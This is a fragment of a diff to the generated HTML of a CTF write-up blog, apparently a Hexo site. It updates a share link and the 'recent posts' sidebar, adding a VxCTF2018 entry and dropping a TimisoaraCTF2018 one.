+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-Squirrels/" data-id="cjh2a68h8000krsw5xr2lvc1r" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -506,6 +524,10 @@
       <ul>
         
           <li>
+            <a href="/2018/05/12/VxCTF2018-BabySanity/">VxCTF2018-BabySanity</a>
+          </li>
+        
+          <li>
             <a href="/2018/05/01/ASISCTF2018-LeftOrRight/">ASISCTF2018-LeftOrRight</a>
           </li>
         
@@ -519,10 +541,6 @@
         
           <li>
             <a href="/2018/04/22/TimisoaraCTF2018-Pshchology/">TimisoaraCTF2018-Pshchology</a>
-          </li>
-        
-          <li>
-            <a href="/2018/04/22/TimisoaraCTF2018-ForeignLanguage/">TimisoaraCTF2018-ForeignLanguage</a>
           </li>
         
       </ul>
